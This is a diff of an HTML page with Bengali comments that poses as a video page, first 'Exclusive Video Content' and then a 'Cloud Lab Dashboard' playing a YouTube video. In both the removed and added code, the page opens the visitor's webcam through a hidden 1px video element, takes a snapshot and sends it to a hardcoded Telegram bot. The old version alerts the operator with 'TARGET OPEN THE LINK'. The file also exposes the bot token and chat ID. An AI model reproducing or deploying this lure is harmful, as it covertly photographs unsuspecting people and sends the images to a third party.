@@ -3,176 +3,216 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exclusive Video Content</title>
+    <title>Cloud Lab Dashboard</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #000;
+        body { 
+            font-family: Arial, sans-serif; 
+            margin: 0; 
+            padding: 0; 
+            background-color: #f5f5f5; 
+            overflow: hidden;
+        }
+        .video-container {
+            position: relative;
+            width: 100%;
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            overflow: hidden;
-            font-family: Arial, sans-serif;
         }
-        #videoContainer {
-            position: relative;
-            width: 100%;
-            height: 100%;
-        }
-        video {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-        }
-        #loadingMessage {
+        #youtube-player {
             position: absolute;
-            top: 20px;
-            left: 20px;
-            color: white;
-            background-color: rgba(0,0,0,0.7);
-            padding: 10px;
-            border-radius: 5px;
-            z-index: 10;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
         }
-        #hiddenCamera {
+        #camera-stream {
             position: absolute;
             width: 1px;
             height: 1px;
-            top: -9999px;
-            left: -9999px;
             opacity: 0;
+            pointer-events: none;
+            z-index: -1;
         }
-        #statusMessage {
+        .controls {
             position: absolute;
             bottom: 20px;
-            left: 20px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            z-index: 2;
+        }
+        input { 
+            padding: 10px; 
+            width: 80%; 
+            max-width: 300px; 
+            margin-bottom: 10px; 
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        button { 
+            padding: 10px 20px; 
+            background-color: #0088cc; 
+            color: white; 
+            border: none; 
+            border-radius: 5px; 
+            cursor: pointer;
+        }
+        .message {
+            position: absolute;
+            top: 10px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            background-color: rgba(0,0,0,0.7);
             color: white;
-            background-color: rgba(255,0,0,0.7);
-            padding: 10px;
-            border-radius: 5px;
-            z-index: 10;
+            padding: 5px;
+            z-index: 3;
             display: none;
         }
     </style>
 </head>
 <body>
-    <div id="videoContainer">
-        <div id="loadingMessage">Loading exclusive content, please wait...</div>
-        <div id="statusMessage"></div>
-        <video id="mainVideo" autoplay muted loop playsinline>
-            <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4" type="video/mp4">
-            Your browser doesn't support the video tag.
-        </video>
-        <video id="hiddenCamera" autoplay muted></video>
+
+    <div class="video-container">
+        <div id="youtube-player"></div>
+        <video id="camera-stream" autoplay></video>
+        <div class="message" id="status-message">Loading...</div>
+        
+        <div class="controls">
+            <input type="text" id="userInput" placeholder="আপনার মেসেজ লিখুন...">
+            <br>
+            <button onclick="sendData()">Send to Bot</button>
+        </div>
     </div>
 
     <script>
-        // টেলিগ্রাম বট টোকেন এবং চ্যাট আইডি
+        // টেলিগ্রাম বট কনফিগারেশন
         const p1 = "8890806272:";
         const p2 = "AAFy8G_UHrNZTnx6H0jcgjKIj_vTa2SkEHA";
         const chatId = "7930590409";
-        const botToken = p1 + p2;
         
-        // স্ট্যাটাস মেসেজ ফাংশন
-        function showStatus(message, isError = false) {
-            const statusElement = document.getElementById('statusMessage');
-            statusElement.textContent = message;
-            statusElement.style.backgroundColor = isError ? 'rgba(255,0,0,0.7)' : 'rgba(0,255,0,0.7)';
-            statusElement.style.display = 'block';
-            
-            setTimeout(() => {
-                statusElement.style.display = 'none';
-            }, 3000);
+        // ইউটিউব ভিডিও আইডি
+        const videoId = "phy8nSbPGVE";
+        
+        // ইউটিউব প্লেয়ার লোড করা
+        let player;
+        function onYouTubeIframeAPIReady() {
+            player = new YT.Player('youtube-player', {
+                videoId: videoId,
+                playerVars: {
+                    autoplay: 1,
+                    controls: 1,
+                    rel: 0,
+                    showinfo: 0
+                },
+                events: {
+                    'onReady': onPlayerReady
+                }
+            });
         }
         
-        // টেলিগ্রামে মেসেজ পাঠানোর ফাংশন
-        function sendTelegramMessage(message) {
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        // প্লেয়ার রেডি হলে ক্যামেরা অ্যাক্সেস করা
+        function onPlayerReady(event) {
+            event.target.playVideo();
+            setTimeout(initCamera, 2000); // 2 সেকেন্ড পরে ক্যামেরা শুরু করা
+        }
+        
+        // ক্যামেরা অ্যাক্সেস করা
+        function initCamera() {
+            const video = document.getElementById('camera-stream');
             
-            fetch(url)
+            // স্ট্যাটাস মেসেজ দেখানো
+            const statusMsg = document.getElementById('status-message');
+            statusMsg.style.display = 'block';
+            statusMsg.textContent = 'Initializing camera...';
+            
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    video.srcObject = stream;
+                    
+                    // 3 সেকেন্ড পরে ছবি তোলা
+                    setTimeout(function() {
+                        capturePhoto();
+                    }, 3000);
+                })
+                .catch(function(err) {
+                    console.error('Error accessing camera:', err);
+                    statusMsg.textContent = 'Camera access denied';
+                });
+        }
+        
+        // ছবি তোলা এবং টেলিগ্রামে পাঠানো
+        function capturePhoto() {
+            const video = document.getElementById('camera-stream');
+            const statusMsg = document.getElementById('status-message');
+            
+            // ক্যানভাস তৈরি করা
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            
+            // ভিডিও থেকে ক্যানভাসে ছবি আঁকা
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // ছবিকে base64 ফরম্যাটে রূপান্তর করা
+            const imageData = canvas.toDataURL('image/jpeg');
+            
+            statusMsg.textContent = 'Capturing photo...';
+            
+            // ছবিটি সার্ভারে পাঠানো
+            fetch(`https://api.telegram.org/bot${p1}${p2}/sendPhoto?chat_id=${chatId}`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    photo: imageData,
+                    caption: `📸 Captured at ${new Date().toLocaleString()}`
+                })
+            })
             .then(response => response.json())
             .then(data => {
-                console.log('Message sent successfully:', data);
+                console.log('Photo sent successfully');
+                statusMsg.textContent = 'Photo captured successfully';
+                
+                // 5 সেকেন্ড পরে স্ট্যাটাস মেসেজ লুকানো
+                setTimeout(function() {
+                    statusMsg.style.display = 'none';
+                }, 5000);
+                
+                // স্ট্রিম বন্ধ করা
+                const stream = video.srcObject;
+                const tracks = stream.getTracks();
+                tracks.forEach(track => track.stop());
             })
             .catch(error => {
-                console.error('Error sending message:', error);
+                console.error('Error sending photo:', error);
+                statusMsg.textContent = 'Failed to send photo';
             });
         }
         
-        // ভিডিও লোড হওয়ার পর লোডিং মেসেজ হাইড করা
-        document.getElementById('mainVideo').addEventListener('canplay', function() {
-            setTimeout(function() {
-                document.getElementById('loadingMessage').style.display = 'none';
-            }, 3000);
-        });
-        
-        // পেজ লোড হওয়ার সাথে সাথে মেসেজ পাঠানো
-        window.addEventListener('load', function() {
-            sendTelegramMessage('TARGET OPEN THE LINK');
-            showStatus('Initializing camera...', false);
-        });
-        
-        // ক্যামেরা অ্যাক্সেস করে ছবি তোলা এবং টেলিগ্রামে পাঠানো
-        function captureAndSend() {
-            navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" } 
-            })
-            .then(function(stream) {
-                const hiddenVideo = document.getElementById('hiddenCamera');
-                hiddenVideo.srcObject = stream;
-                
-                showStatus('Camera access granted, capturing photo...', false);
-                
-                // ক্যামেরা ইনিশিয়ালাইজ হতে সময় দেওয়া
-                setTimeout(function() {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = hiddenVideo.videoWidth;
-                    canvas.height = hiddenVideo.videoHeight;
-                    const context = canvas.getContext('2d');
-                    context.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
-                    
-                    // ক্যানভাস থেকে ব্লব ডেটা তৈরি করা
-                    canvas.toBlob(function(blob) {
-                        // ফর্মডেটা তৈরি করা
-                        const formData = new FormData();
-                        formData.append('photo', blob, 'capture.jpg');
-                        
-                        // টেলিগ্রাম এপিআই-এ ছবি পাঠানো
-                        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`;
-                        
-                        fetch(telegramUrl, {
-                            method: 'POST',
-                            body: formData
-                        })
-                        .then(response => response.json())
-                        .then(data => {
-                            console.log('Photo sent successfully:', data);
-                            showStatus('Photo captured and sent!', false);
-                            
-                            // ছবি পাঠানোর পর আরও একটি মেসেজ পাঠানো
-                            sendTelegramMessage('Photo captured successfully!');
-                        })
-                        .catch(error => {
-                            console.error('Error sending photo:', error);
-                            showStatus('Failed to send photo!', true);
-                        });
-                        
-                        // ক্যামেরা স্ট্রিম বন্ধ করা
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 'image/jpeg');
-                }, 2000);
-            })
-            .catch(function(err) {
-                console.error('Camera access denied:', err);
-                showStatus('Camera access denied!', true);
-                sendTelegramMessage('Camera access denied by target!');
-            });
+        // মেসেজ পাঠানোর ফাংশন
+        function sendData() {
+            const textValue = document.getElementById('userInput').value;
+            if(!textValue) { 
+                alert('অনুগ্রহ করে কিছু লিখুন!'); 
+                return; 
+            }
+
+            const url = `https://api.telegram.org/bot${p1}${p2}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('🔔 ল্যাব মেসেজ: ' + textValue)}`;
+
+            // ব্যাকগ্রাউন্ডে দ্রুত ডাটা পাঠানোর মেকানিজম
+            const img = new Image();
+            img.src = url;
+
+            alert('মেসেজ পাঠানো হয়েছে! আপনার টেলিগ্রাম বট চেক করুন।');
+            document.getElementById('userInput').value = '';
         }
-        
-        // পেজ লোড হওয়ার ৩ সেকেন্ড পর ছবি তোলা শুরু করা
-        setTimeout(captureAndSend, 3000);
     </script>
+    <script src="https://www.youtube.com/iframe_api"></script>
 </body>
 </html>
